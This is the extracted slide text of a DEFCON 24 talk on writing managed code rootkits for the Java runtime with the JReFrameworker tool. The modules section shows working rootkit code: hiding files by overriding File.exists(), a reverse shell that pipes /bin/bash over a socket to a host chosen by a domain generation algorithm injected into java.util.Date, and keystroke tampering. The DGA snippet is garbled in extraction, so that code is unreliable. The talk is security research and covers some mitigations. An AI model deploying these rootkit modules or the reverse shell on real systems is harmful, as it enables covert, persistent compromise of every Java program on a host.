Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java
Runtime Environment
DEFCON 24, August 6th 2016
Benjamin Holland (daedared)
ben-holland.com
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Developing Managed Code Rootkits for the Java
Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
$ whoami
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
$ whoami
Benjamin Holland (daedared)
B.S. in Computer Engineering (2005 - 2010)
Wabtec Railway Electronics, Ames Lab, Rockwell Collins
B.S. in Computer Science (2010 - 2011)
M.S. in Computer Engineering and Information Assurance (2010 - 2012)
MITRE
Iowa State University Research (2012 - 2015)
DARPA Automated Program Analysis for Cybersecurity (APAC) Program
PHD in Computer Engineering (2015-????)
DARPA Space/Time Analysis for Cybersecurity (STAC) Program
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
DEFCON Inspirations
It is truly an honor to be here...
Early memories of reading Winn Schwartau’s
Information Warfare
One of my ﬁrst introductions to security topics
This talk itself was inspired by a previous
DEFCON talk
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Background
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hello World
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hello (weird) World
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Java Runtime Environment
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Managed Code Rootkits (MCRs)
Post exploitation activity (need root/administrator privileges)
C:\Program Files\Java\. . . \lib\rt.jar
Compromises EVERY program using the modiﬁed runtime
Out of sight out of mind
Code reviews/audits don’t audit runtimes (typically)
May be overlooked by forensic investigators
Rootkits are platform independent (if done right)
Runtimes are already fully featured
Object Oriented programming
Standard libraries
Additional access to low level APIs
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Strategies for Modifying the Runtime
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Strategies for Modifying the Runtime
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pioneering Work
Pioneering work by Erez Metula (DEFCON 17)
"ReFrameworker" tool to modify .NET runtimes
XML modules deﬁne injection tasks
Generates deployment scripts
Uses an assembler/disassembler pair to make modiﬁcations
Usability? To make modules you have to write code in IR.
Portability? Depends on your target and module
implementation.
Maintenance? Last update was over 6 years ago...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
New Framework Goals
MCR support for Java Runtime Environment
Minimal prerequisite user knowledge
No knowledge of bytecode or intermediate languages
Simple development cycle
Consider: developing, debugging, deploying
Portability (Write Once, Exploit Everywhere)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
Write rootkits in Java source!
Modiﬁcation behaviors deﬁned with source
annotations
Develop and debug in Eclipse IDE
Exploit "modules" are Eclipse Java projects
Exportable payload droppers
Bytecode injections are computed on the ﬂy
Free + Open Source (MIT License):
github.com/benjholla/JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
JReFrameworker
Write rootkits in Java source!
Modiﬁcation behaviors deﬁned with source
annotations
Develop and debug in Eclipse IDE
Exploit "modules" are Eclipse Java projects
Exportable payload droppers
Bytecode injections are computed on the ﬂy
Free + Open Source (MIT License):
github.com/benjholla/JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hello (weird) World Revisited
@MergeType
public class BackwardsPrintStream extends java.io.PrintStream {
@MergeMethod
@Override
public void println(String str){
StringBuilder sb = new StringBuilder(str);
super.println(sb.reverse().toString());
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Annotation Types
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Annotation Types
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Modules
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Get Creative
Time to get creative...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File Module
@MergeType
public class HiddenFile extends java.io.File {
@MergeMethod
@Override
public boolean exists(){
if(isFile() && getName().equals("secretFile")){
return false;
} else {
return super.exists();
}
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File Module
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Hidden File Module
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
@MergeType
public class BeetlejuiceObject extends java.lang.Object {
@DefineField
private int beetlejuice;
@MergeMethod
public String toString(){
StackTraceElement[] st = new Exception().getStackTrace();
for(StackTraceElement element : st)
if(element.getMethodName().equals("beetlejuice"))
if(++beetlejuice==3) i.Main.main(new String[]{});
return super.toString();
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
public class Test {
static class TimBurton {}
public static void main(String[] args) {
TimBurton timBurton = new TimBurton();
beetlejuice(timBurton);
beetlejuice(timBurton);
beetlejuice(timBurton);
}
private static void beetlejuice(TimBurton timBurton){
System.out.println(timBurton.toString());
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Beetlejuice
The “i.Main.main(new String[]);”
invokes Mocha DOOM
Port of DOOM shareware to pure Java
github.com/AXDOOMER/mochadoom
Payload behaviors can depend on the
state or structure of the client program
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
Deﬁne a java.util.StreamForwarder class
Forward shell inputs/outputs to TCP stream
InetAddress address = InetAddress.getByName(domain);
String ipAddress = address.getHostAddress();
final Process process = Runtime.getRuntime().exec("/bin/bash");
Socket socket = new Socket(ipAddress, 6666);
forwardStream(socket.getInputStream(), process.getOutputStream());
forwardStream(process.getInputStream(), socket.getOutputStream());
forwardStream(process.getErrorStream(), socket.getOutputStream());
process.waitFor();
...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
Merge Domain Generation Algorithm (DGA) logic into java.util.Date
String domain = "www.";
int year = getYear();
int month = getMonth();
int day = getDay();
for(int i=0; i> 11) ^ ((year & 0xFFFFFFF0) > 25) ^ 16 * (month & 0xFFFFFFF8);
day = ((day ^ (day > 19) ^ ((day & 0xFFFFFFFE) << 12);
domain += (char)(((year ^ month ^ day) % 25) + 97);
}
domain += ".com";
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
Malicious client probes for payload
Create a reverse shell to the domain of the day
public static void main(String[] args) throws Exception {
Date d = new Date();
// attempts to invoke a private method named reverseShell
// in java.util.Date that may or may not exist ;)
Method method = d.getClass().getDeclaredMethod("reverseShell");
method.setAccessible(true);
method.invoke(d);
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
SpellWrecker
Deﬁne SpellWrecker class (inverse of a spellchecker)
As average typing speed increases, more typos are injected
As average typing speed reduces, less typos are injected
@MergeType
public class SpellWreckedKeyEvent extends KeyEvent {
@MergeMethod
@Override
public char getKeyChar(){
char original = super.getKeyChar();
return SpellWrecker.spellwreck(original);
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Mitigations
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Bytecode Modiﬁcation Indicators
What is wrong with this picture? (hint: look at the line numbers)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Q/A
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Questions?
Thank you!
Resources:
Setup + Tutorials: ben-holland.com/JReFrameworker
Source Code: github.com/benjholla/JReFrameworker
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment